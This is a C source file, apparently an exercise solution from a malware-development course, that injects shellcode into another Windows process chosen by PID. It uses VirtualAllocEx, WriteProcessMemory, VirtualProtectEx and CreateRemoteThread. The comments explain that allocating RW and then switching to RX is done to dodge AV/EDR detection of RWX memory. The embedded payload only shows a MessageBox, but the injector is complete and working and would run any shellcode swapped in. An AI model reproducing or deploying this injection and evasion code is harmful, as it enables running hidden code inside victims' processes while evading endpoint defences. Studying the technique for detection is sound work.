/*
 * exercise 4 solution
 * classic shellcode injection - W^X (Write XOR Execute) memory pattern
 * hack4.c
 * author: @cocomelonc
 *
 * base: 01-shellcode/hack.c
 *
 * change: replace the single PAGE_EXECUTE_READWRITE allocation with a
 * two-step W^X approach using VirtualProtectEx.
 *
 * why PAGE_EXECUTE_READWRITE (RWX) is suspicious:
 *   AV/EDR engines flag memory regions that are both writable AND
 *   executable at the same time because legitimate code never needs
 *   both permissions simultaneously.
 *
 * the W^X pattern:
 *   step 1 - allocate with PAGE_READWRITE   (write allowed, no execute)
 *   step 2 - copy the shellcode             (WriteProcessMemory)
 *   step 3 - flip to PAGE_EXECUTE_READ via VirtualProtectEx
 *             (execute allowed, write removed)
 *   step 4 - CreateRemoteThread to run it
 *
 * key new API: VirtualProtectEx
 *   BOOL VirtualProtectEx(
 *     HANDLE  hProcess,       // target process handle
 *     LPVOID  lpAddress,      // start of region to change
 *     SIZE_T  dwSize,         // size in bytes
 *     DWORD   flNewProtect,   // new protection constant
 *     PDWORD  lpflOldProtect  // receives the old protection value
 *   );
 *   returns non-zero on success, zero on failure (call GetLastError).
 *
 * what to observe:
 *   use Process Hacker / VMMap during execution.
 *   before CreateRemoteThread: region shows RW (not RWX).
 *   after VirtualProtectEx:    region shows RX  (not RWX).
 *
 * compile (cross-compile from Linux):
 * x86_64-w64-mingw32-gcc hack4.c -o hack4.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// same payload as original hack.c (MessageBox shellcode)
unsigned char my_payload[] =
  "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
  "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
  "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
  "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
  "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
  "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
  "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
  "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
  "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
  "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
  "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
  "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
  "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
  "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
  "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
  "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
  "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
  "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
  "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
  "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
  "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
  "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
  "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
  "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
  "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
  "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
  "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
  "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
  "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

int main(int argc, char* argv[]) {
  HANDLE ph;         // process handle
  HANDLE rt;         // remote thread
  PVOID  rb;         // remote buffer
  DWORD  oldProtect; // receives the previous protection value (required by VirtualProtectEx)

  if (argc < 2) {
    printf("usage: hack4.exe <PID>\n");
    return -1;
  }

  printf("[*] target PID: %i\n", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));
  if (ph == NULL) {
    printf("[-] OpenProcess failed: %lu\n", GetLastError());
    return -1;
  }

  /*
   * exercise 4 change - step 1:
   * original: VirtualAllocEx(..., PAGE_EXECUTE_READWRITE)
   * updated:  VirtualAllocEx(..., PAGE_READWRITE)
   *
   * the region is now writable but NOT executable.
   * at this point a memory scanner would see an RW region - normal.
   */
  rb = VirtualAllocEx(ph, NULL, sizeof(my_payload),
                      (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
  if (rb == NULL) {
    printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
    CloseHandle(ph);
    return -1;
  }
  printf("[+] remote buffer allocated (RW) at %p\n", rb);

  /*
   * step 2: write the shellcode while the page is still writable.
   * this is the same as the original - no change here.
   */
  if (!WriteProcessMemory(ph, rb, my_payload, sizeof(my_payload), NULL)) {
    printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
    CloseHandle(ph);
    return -1;
  }
  printf("[+] shellcode written\n");

  /*
   * exercise 4 change - step 3: VirtualProtectEx
   * flip the region from PAGE_READWRITE -> PAGE_EXECUTE_READ.
   * after this call:
   *   - the shellcode can be executed  (execute permission ON)
   *   - the shellcode can no longer be overwritten (write permission OFF)
   * oldProtect receives PAGE_READWRITE (the value before the change).
   */
  if (!VirtualProtectEx(ph, rb, sizeof(my_payload),
                        PAGE_EXECUTE_READ, &oldProtect)) {
    printf("[-] VirtualProtectEx failed: %lu\n", GetLastError());
    CloseHandle(ph);
    return -1;
  }
  printf("[+] protection changed RW -> RX (old: 0x%lX)\n", oldProtect);

  /*
   * step 4: execute - same as original.
   * the region is now RX, so CreateRemoteThread can run it,
   * but no further writes are possible (W^X satisfied).
   */
  rt = CreateRemoteThread(ph, NULL, 0,
                          (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
  if (rt == NULL) {
    printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
    CloseHandle(ph);
    return -1;
  }

  WaitForSingleObject(rt, 5000);
  CloseHandle(rt);
  CloseHandle(ph);
  printf("[+] done :)\n");
  return 0;
}
